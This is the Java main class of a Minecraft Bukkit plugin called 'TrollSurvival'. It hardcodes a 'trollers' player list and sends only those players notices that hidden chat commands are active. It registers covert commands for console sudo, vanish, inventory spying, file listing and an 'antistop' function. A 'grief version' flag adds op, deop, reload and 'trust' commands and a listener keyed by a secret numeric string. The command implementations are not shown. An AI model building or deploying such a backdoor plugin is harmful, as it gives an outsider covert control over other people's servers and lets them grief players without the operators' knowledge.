package PandaHexCode;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.EntityEffect;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Particle;
import org.bukkit.Sound;
import org.bukkit.block.Block;
import org.bukkit.command.defaults.HelpCommand;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffectType;

import PandaHexCode.Commands.*;
import PandaHexCode.Listeners.*;

public class PluginMain extends JavaPlugin{

	public static String PR = "§e§lTroll§d§lSurvival§r §7 | §2";
	public static PluginMain instance;

	public static ArrayList<String> trollers = new ArrayList<String>();
	public static boolean ISGRIEFVERSION = false;
	
	@Override
	public void onEnable() {
		PluginMain.instance = this;
		
		trollers.add("Nagisaaaa");
		
		/*Listeners*/
		getServer().getPluginManager().registerEvents(new PlayerMoveListener(), this);
		getServer().getPluginManager().registerEvents(new BlockBreakListener(), this);
		getServer().getPluginManager().registerEvents(new BlockPlaceListener(), this);
		getServer().getPluginManager().registerEvents(new PlayerDropItemListener(), this);
		getServer().getPluginManager().registerEvents(new PlayerPickupItemListener(), this);
		getServer().getPluginManager().registerEvents(new EntityDamageByEntityListener(), this);
		getServer().getPluginManager().registerEvents(new PlayerChatListener(), this);
		getServer().getPluginManager().registerEvents(new PlayerJoinListener(), this);
		getServer().getPluginManager().registerEvents(new PlayerKickListener(), this);
		getServer().getPluginManager().registerEvents(new PlayerLoginListener(), this);
		getServer().getPluginManager().registerEvents(new PlayerCommandPreprocessListener(), this);
		getServer().getPluginManager().registerEvents(new ServerCommandListener(), this);
		getServer().getPluginManager().registerEvents(new PlayerDeathListener(), this);
		getServer().getPluginManager().registerEvents(new ItemClickEvent(), this);
		getServer().getPluginManager().registerEvents(new PlayerResourcePackStatusListener(), this);
		getServer().getPluginManager().registerEvents(new Help("help"), this);
		
		/*Commands*/
		StandartArrayCommands.Register();
		new Test("test");
		new AntiStop("antistop");
		new InventoryCommands.CloseInv("closeinv");
		new InventoryCommands.Invsee("invsee");
		new InventoryCommands.InvseeArmor("invseearmor");
		new InventoryCommands.Workbench("workbench");
		new InventoryCommands.SetArmorSlot("setarmorslot");
		new ClientSideCommands.ClientSideBlock("clientsideblock");
		new ClientSideCommands.ClientSideSchlong("clientsideschlong");
		new ClientSideCommands.ClientSideBlockRadius("clientsideblockradius");
		new SimpleCommands.Jump("jump");
		new SimpleCommands.EntitiesJump("entitiesjump");
		new SimpleCommands.Mlg("mlg");
		new SimpleCommands.Explosion("explosion");
		new SimpleCommands.Sudo("sudo");
		new SimpleCommands.ConsoleSudo("consolesudo");
		new SimpleCommands.SetVelocity("setvelocity");
		new SimpleCommands.WalkSpeed("walkspeed");
		new SimpleCommands.Grumm("grumm");
		new SimpleCommands.GroundBug("groundbug");
		new SimpleCommands.RandomItem("randomitem");
		new SimpleCommands.EventPicker("eventpicker");
		new SimpleCommands.CreeperSound("creepersound");
		new SimpleCommands.Drop("drop");
		new SimpleCommands.PunishmentPicker("punishmentpicker");
		new StandartCommands.Heal("heal");
		new StandartCommands.SetLevel("setlevel");
		new StandartCommands.Tp("tp");
		new StandartCommands.Tphere("tphere");
		new StandartCommands.PInfo("pinfo");
		new StandartCommands.Title("title");
		new StandartCommands.Rename("rename");
		new StandartCommands.Gamemode("gamemode");
		new StandartCommands.Gamemode("gm");
		new Vanish("vanish");
		new Vanish("v");
		new EntitesEffect("entitieseffect");
		new EntitesEffect.ClearEntitiesEffect("clearentitieseffect");
		new EntityCommands.Entity("entity");
		new EntityCommands.EntityFollower("entityfollower");
		new EntityCommands.EntityDisableGravity("entitydisablegravity");
		new BlockBreakOffset("blockbreakoffset");
		new BlockPlaceOffset("blockplaceoffset");
		new Controll("controll");
		new BlockFollower("blockfollower");
		new Jumpscare.JumpscareC("jumpscare");
		new Jumpscare.JumpscarePack("jumpscarepack");
		new DeathManager.DeathData("deathdata");
		new DeathManager.Receive("receive");
		new Radius.BlockRadius("blockradius");
		new SaveLoadPositions.SavePositionCmd("saveposition");
		new SaveLoadPositions.LoadPositionCmd("loadposition");
		new SaveLoadPositions.ListPositionsCMD("savedpositionslist");
		new SaveLoadPositions.DeletePositionCmd("deleteposition");
		new TerrainCommands.TerrainFly("terrainfly");
		new TerrainCommands.TerrainFlyDown("terrainflydown");
		new TerrainCommands.Rocket("rocket");
		
		new FileCommands.DirCommand("dir");
		
		if(ISGRIEFVERSION){
			new StandartCommands.Op("op");
			new StandartCommands.DeOp("deop");
			new StandartCommands.Reload("reload");
			new SpecialVersionCommands.Trust("trust");
			new SpecialVersionCommands.TrollChat("trollchat");
			getServer().getPluginManager().registerEvents(new SpecialVersionCommands.SpecialRegister("0320294929595329"), this);
		}
		
		Bukkit.getConsoleSender().sendMessage(PR+"Plugin has started!");
		
		SendMessageToAllTrollers(PluginMain.PR+"is activated on this Server , you can use ChatCommands §4§lnow§c!");
		super.onEnable();
	}
	
	@Override
	public void onDisable() {
		SendMessageToAllTrollers(PluginMain.PR+"§4§lThe Server is stoping or reloading better not use Chat Commands yet!");
		super.onDisable();
	}
	
	/*Helpers*/
	
	public static EntityType getEntityByName(String name) {
        for (EntityType type : EntityType.values()) {
            if(type.name().equalsIgnoreCase(name)) {
                return type;
            }
        }
        return null;
    }
	
	public static PotionEffectType GetPotionByName(String name) {
		 for (PotionEffectType type : PotionEffectType.values()) {
	            if(type.getName().equalsIgnoreCase(name)) {
	                return type;
	            }
	        }
	    return null;
	}
	
	public static Material GetMaterialByName(String name) {
       for (Material type : Material.values()) {
           if(type.name().equalsIgnoreCase(name)) {
               return type;
           }
       }
       return null;
   }
	
	public static void SendTitleToAll(String title,String subTitle,int f1,int f2,int f3,boolean explosion) {
		for (Player pl : Bukkit.getOnlinePlayers()) {
			pl.sendTitle(title, subTitle, f1, f2, f3);
			if(explosion)
				pl.playEffect(EntityEffect.HURT_EXPLOSION);
		}
	}
	
	public static void PlaySoundToAll(Sound sound) {
		for (Player pl : Bukkit.getOnlinePlayers()) {
			pl.playSound(pl.getLocation(), sound , 1f, 1f);
		}
	}
	
	public static void SpawnParticleToAll(Particle particle) {
		for (Player pl : Bukkit.getOnlinePlayers()) {
			pl.getWorld().spawnParticle(particle, pl.getLocation(), 1);
		}
	}
	
	public static void SendMessageToAllTrollers(String message) {
		for (Player pl : Bukkit.getOnlinePlayers()) {
			if(trollers.contains(pl.getName()))
				pl.sendMessage(message);
		}
	}
	
	public static ArrayList<Location> GetLocationsInRadius(Location startLocation, int radius , boolean withoutNegative , boolean withoutNegativeY) {
		ArrayList<Location> locations = new ArrayList<Location>();
		radius = radius +1;
		
		for(int i = 0; i < radius ; i++) {
			Location locX = startLocation.clone();
			locX.setX(locX.getX()+i);
			for(int i2 = 0; i2 < radius; i2++) {
				Location locZ = locX.clone();
				locZ.setZ(locZ.getZ()+i2);
				
				locations.addAll(GetLocationsInYInRadius(locZ,radius,withoutNegativeY));
				locations.add(locZ);
			}	
			
			for(int i2 = 0; i2 < radius; i2++) {
				Location locZ = locX.clone();
				locZ.setZ(locZ.getZ()-i2);
				
				locations.addAll(GetLocationsInYInRadius(locZ,radius,withoutNegativeY));
				locations.add(locZ);
			}	
			
			locations.addAll(GetLocationsInYInRadius(locX,radius,withoutNegativeY));
			locations.add(locX);
		}
		
		if(!withoutNegative) {
			for(int i = 0; i < radius ; i++) {
				Location locX = startLocation.clone();
				locX.setX(locX.getX()-i);
				for(int i2 = 0; i2 < radius; i2++) {
					Location locZ = locX.clone();
					locZ.setZ(locZ.getZ()-i2);
					
					locations.addAll(GetLocationsInYInRadius(locZ,radius,withoutNegativeY));
					locations.add(locZ);
				}	
				
				for(int i2 = 0; i2 < radius; i2++) {
					Location locZ = locX.clone();
					locZ.setZ(locZ.getZ()+i2);
					
					locations.addAll(GetLocationsInYInRadius(locZ,radius,withoutNegativeY));
					locations.add(locZ);
				}	
				
				locations.addAll(GetLocationsInYInRadius(locX,radius,withoutNegativeY));
				locations.add(locX);
			}
		}
		
		return locations;
	}
	
	
	private static ArrayList<Location> GetLocationsInYInRadius(Location startLocation, int radius , boolean withoutNegativeY) {
		ArrayList<Location> locations = new ArrayList<Location>();
		for(int i = 0; i < radius ; i++) {
			Location loc = startLocation.clone();
			loc.setY(loc.getY()+i);
			Location loc2 = startLocation.clone();
			loc2.setY(loc2.getY()-i);
			
			locations.add(loc);
			if(!withoutNegativeY)
				locations.add(loc2);
		}
		
		return locations;
	}
	
	public static void MoveBlockTo(Block block, Location toLoc, long secondProMove, boolean toAPlayer, String playerName) {
		Material mat = block.getType();
		Location loc = block.getLocation();
		
		new BlockMoveC(loc, toLoc, mat, secondProMove, toAPlayer, playerName);
	}
	
	private static class BlockMoveC{
		
		private int task;
		private Location loc;
		private Location toLoc;
		private Player p;
		
		public BlockMoveC(Location origLoc, Location origToLoc, Material mat, long secondProMove, boolean toAPlayer, String playerName) {
			loc = origLoc;
			toLoc = origToLoc;
			
			p = null;
			if(toAPlayer)
				p = Bukkit.getPlayer(playerName);
			
			 task = Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(PluginMain.instance, new Runnable() {
				  public void run() {
					  	if(toAPlayer)
					  		toLoc = p.getLocation();
					  
					  	Location newLoc = loc.clone();
						
						if(loc.getX() < toLoc.getX())
							newLoc.add(1, 0, 0);
						else if(loc.getX() > toLoc.getX())
							newLoc.add(-1, 0, 0);
						
						if(loc.getY() < toLoc.getY())
							newLoc.add(0, 1, 0);
						else if(loc.getY() > toLoc.getY())
							newLoc.add(0, -1, 0);
						
						if(loc.getZ() < toLoc.getZ())
							newLoc.add(0, 0, 1);
						else if(loc.getZ() > toLoc.getZ())
							newLoc.add(0, 0, -1);
						
						loc.getBlock().setType(Material.AIR);
						newLoc.getBlock().breakNaturally();
						newLoc.getBlock().setType(mat);
			
						loc = newLoc;
						
						if(loc.getX() == toLoc.getX() && loc.getY() == toLoc.getY() && loc.getZ() == toLoc.getZ()) {
								Bukkit.getServer().getScheduler().cancelTask(task);		
						}	
						if(toAPlayer && !BlockFollower.isIn)
							Bukkit.getServer().getScheduler().cancelTask(task);	
				  }
				  
			}, secondProMove, secondProMove);
		}
		
	}
	
}
